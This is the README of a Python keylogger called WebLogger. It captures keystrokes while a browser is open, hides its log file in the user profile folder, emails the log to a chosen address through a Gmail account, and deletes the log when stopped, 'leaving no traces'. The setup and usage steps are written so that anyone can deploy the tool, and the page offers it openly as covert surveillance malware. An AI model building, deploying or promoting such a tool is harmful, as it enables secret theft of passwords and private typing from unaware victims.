# WebLogger

Weblogger is a keylogger that only records keystrokes when a browser is open and active. 
Weblogger saves a hidden log file in the %USERPROFILE% directory, and when it hits 
MAX_DATA_LEN (default: 500 chars), an email is sent with the current log.
When Weblogger stops, an email is sent with the current log and the log file is deleted leaving no traces.

## Setup

Set the GMAIL_DATA with an username and password from a gmail account and the 'email_to' parameter
with an email account for the log to be sent.

## Usage

Usage: python weblogger.pyw

## Stop Weblogger

Open a browser and type 'webloggerkill' (without quotation marks)

